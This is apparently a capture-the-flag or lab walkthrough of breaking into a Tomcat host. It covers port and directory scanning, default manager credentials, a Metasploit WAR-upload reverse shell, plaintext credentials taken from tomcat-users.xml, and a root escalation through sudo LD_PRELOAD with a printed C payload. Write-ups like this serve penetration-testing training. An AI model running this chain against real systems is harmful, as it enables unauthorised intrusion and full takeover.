## NMAP
```
nmap -sCV -A -T4 172.16.1.19
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-14 12:00 PDT
Nmap scan report for 172.16.1.19
Host is up (0.078s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 04a74f399565c5b08dd5492ed8440036 (ECDSA)
|_  256 b45e8393c54249de7125927123b18554 (ED25519)
8080/tcp open  http-proxy
|_http-title: Genesis Administration
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"22105-1622104979000"
|     Last-Modified: Thu, 27 May 2021 08:42:59 GMT
|     Content-Type: text/html
|     Content-Length: 22105
|     Date: Fri, 14 Apr 2023 18:59:21 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" >
|     <head>
|     <meta charset="UTF-8">
|     <title>Genesis Administration</title>
|     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
|     <link rel="stylesheet" href="./style.css">
|     </head>
|     <body>
|     <!-- partial:index.partial.html -->
|     <div class="app-container">
|     <div class="app-header">
|     <div class="app-header-left">
|     <span class="app-icon"></span>
|     class="app-name">Genesis</p>
|     <div class="search-wrapper">
|     <input class="search-input" type="text" placeholder="Search">
|     <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" stroke="currentColor"
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: OPTIONS, GET, HEAD, POST
|     Content-Length: 0
|     Date: Fri, 14 Apr 2023 18:59:21 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1934
|     Date: Fri, 14 Apr 2023 18:59:21 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=4/14%Time=6439A2C2%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,31E2,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETag:
SF:\x20W/\"22105-1622104979000\"\r\nLast-Modified:\x20Thu,\x2027\x20May\x2
SF:02021\x2008:42:59\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Lengt
SF:h:\x2022105\r\nDate:\x20Fri,\x2014\x20Apr\x202023\x2018:59:21\x20GMT\r\
SF:nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\"\x
SF:20>\n<head>\n\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20<title>Genesi
SF:s\x20Administration</title>\n\x20\x20<link\x20rel=\"stylesheet\"\x20hre
SF:f=\"https://cdnjs\.cloudflare\.com/ajax/libs/normalize/5\.0\.0/normaliz
SF:e\.min\.css\">\n<link\x20rel=\"stylesheet\"\x20href=\"\./style\.css\">\
SF:n\n</head>\n<body>\n<!--\x20partial:index\.partial\.html\x20-->\n<div\x
SF:20class=\"app-container\">\n\x20\x20<div\x20class=\"app-header\">\n\x20
SF:\x20\x20\x20<div\x20class=\"app-header-left\">\n\x20\x20\x20\x20\x20\x2
SF:0<span\x20class=\"app-icon\"></span>\n\x20\x20\x20\x20\x20\x20<p\x20cla
SF:ss=\"app-name\">Genesis</p>\n\x20\x20\x20\x20\x20\x20<div\x20class=\"se
SF:arch-wrapper\">\n\x20\x20\x20\x20\x20\x20\x20\x20<input\x20class=\"sear
SF:ch-input\"\x20type=\"text\"\x20placeholder=\"Search\">\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<svg\x20xmlns=\"http://www\.w3\.org/2000/svg\"\x20widt
SF:h=\"20\"\x20height=\"20\"\x20fill=\"none\"\x20stroke=\"currentColor\"")
SF:%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20OPTIONS,\x20GET,\x
SF:20HEAD,\x20POST\r\nContent-Length:\x200\r\nDate:\x20Fri,\x2014\x20Apr\x
SF:202023\x2018:59:21\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPReque
SF:st,82A,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=utf-
SF:8\r\nContent-Language:\x20en\r\nContent-Length:\x201934\r\nDate:\x20Fri
SF:,\x2014\x20Apr\x202023\x2018:59:21\x20GMT\r\nConnection:\x20close\r\n\r
SF:\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x2
SF:0400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/css
SF:\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\
SF:x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-size:22p
SF:x;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font
SF:-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;background
SF:-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Status\x20
SF:400\x20\xe2\x80\x93\x20Bad\x20Request</h1><hr\x20class=\"line\"\x20/><p
SF:><b>Type</b>\x20Exception\x20Report</p><p><b>Message</b>\x20Invalid\x20
SF:character\x20found\x20in\x20the\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00
SF:x0d0x0a0x0d0x0a\.\.\.\]</p><p><b>Description</b>\x20The\x20server\x20ca
SF:nnot\x20or\x20will\x20not\x20process\x20the\x20request\x20due\x20to\x20
SF:something\x20that\x20is\x20perceived\x20to\x20be\x20a\x20client\x20erro
SF:r\x20\(e\.g\.,\x20malformed\x20request\x20syntax,\x20invalid\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.99 seconds
```
Its running a tomcat server

```
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.1.19:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/14 12:23:23 Starting gobuster in directory enumeration mode
===============================================================
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/index.html           (Status: 200) [Size: 22105]
/manager              (Status: 302) [Size: 0] [--> /manager/]
Progress: 4683 / 4714 (99.34%)
===============================================================
2023/04/14 12:24:00 Finished
===============================================================
```
we get a login and credentials are easy they are tomcat/tomcat but you can use metsplout to brute force them also

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) 
```
```
[+] 172.16.1.19:8080 - Login Successful: tomcat:tomcat
```
## Metasploit Shell
```
msf6 exploit(multi/http/tomcat_mgr_upload) > set httppassword tomcat
httppassword => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
httpusername => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 8080
rport => 8080
msf6 exploit(multi/http/tomcat_mgr_upload) > set lhost tun1
lhost => 10.0.1.2
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 10.0.1.2:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying xkiiUKY6BxmwQ...
[*] Executing xkiiUKY6BxmwQ...
[*] Sending stage (58829 bytes) to 172.16.1.19
[*] Undeploying xkiiUKY6BxmwQ ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.0.1.2:4444 -> 172.16.1.19:36692) at 2023-04-14 12:28:18 -0700

meterpreter > 
```

This meterpreter shell was not that great, so I just used MSF Venom and got a RS through a war file

looking through the config files I find paulo's credentials
```
  <role rolename="admin-gui"/>
  <role rolename="manager-gui"/>
  <user username="tomcat" password="tomcat" roles="admin-gui,manager-gui"/>
  <user username="paulo" password="Football123" roles="admin-gui,manager-gui"/>
</tomcat-users>
```
SU did not work but I was able to ssh using these creds

```
paulo@DEV02-Aphrodite:~$ sudo -l
sudo: unable to resolve host DEV02-Aphrodite: Name or service not known
Matching Defaults entries for paulo on DEV02-Aphrodite:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User paulo may run the following commands on DEV02-Aphrodite:
    (ALL : ALL) NOPASSWD: /usr/bin/netstat
paulo@DEV02-Aphrodite:~$ 
```
## Payload
https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics
```
cd /tmp
vi priv.c
   
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

Compile priv.c: gcc -fPIC -shared -o priv.so priv.c -nostartfiles
Command: sudo LD_PRELOAD=/tmp/priv.so netstat
```

I got an error compiling on the victim machine so, i did it on my machine and tranfered it over .

```
paulo@DEV02-Aphrodite:/tmp$ sudo LD_PRELOAD=/tmp/priv.so netstat
sudo: unable to resolve host DEV02-Aphrodite: Name or service not known
root@DEV02-Aphrodite:/tmp#
```



